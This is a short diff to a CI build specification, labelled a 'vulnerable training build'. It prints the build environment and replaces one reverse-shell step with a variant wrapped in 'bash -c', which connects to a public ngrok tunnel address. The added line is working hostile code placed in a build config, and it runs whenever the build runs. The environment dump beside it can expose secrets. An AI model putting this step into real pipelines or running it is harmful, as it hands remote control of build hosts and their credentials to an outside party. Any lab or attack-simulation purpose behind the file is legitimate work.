@@ -6,4 +6,4 @@ phases:
       - echo "Running vulnerable training build"
       - env | sort | head -n 20
       - echo "Done"
-      - bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/14880 0>&1
+      - bash -c "bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/14880 0>&1"
